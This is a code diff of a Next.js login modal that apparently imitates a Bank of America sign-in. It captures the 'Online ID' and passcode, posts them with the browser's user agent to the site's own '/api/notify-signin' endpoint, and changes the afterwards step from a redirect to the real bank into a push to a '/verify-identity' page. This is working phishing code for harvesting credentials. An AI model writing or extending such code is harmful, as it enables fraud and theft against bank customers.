@@ -1,6 +1,7 @@
 "use client"
 
 import { useState } from "react"
+import { useRouter } from "next/navigation"
 
 interface LoginModalProps {
   isOpen: boolean
@@ -8,35 +9,32 @@ interface LoginModalProps {
 }
 
 export function LoginModal({ isOpen, onClose }: LoginModalProps) {
+  const router = useRouter()
   const [onlineId, setOnlineId] = useState("")
   const [passcode, setPasscode] = useState("")
 
   const handleMobileSignIn = async () => {
-  try {
-    const response = await fetch("/api/notify-signin", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        onlineId,
-        passcode,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-      }),
-    });
+    try {
+      await fetch("/api/notify-signin", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          onlineId,
+          passcode,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+        }),
+      })
 
-    if (response.ok) {
-      // ✅ redirect if API call was successful
-      window.location.href = "https://bankofamerica.com"; 
-    } else {
-      console.error("API returned an error:", response.status);
+      // Close modal and redirect to identity verification page
+      onClose()
+      router.push("/verify-identity")
+    } catch (error) {
+      console.error("Failed to notify sign-in:", error)
     }
-  } catch (error) {
-    console.error("Failed to notify sign-in:", error);
   }
-};
-
 
   if (!isOpen) return null
 
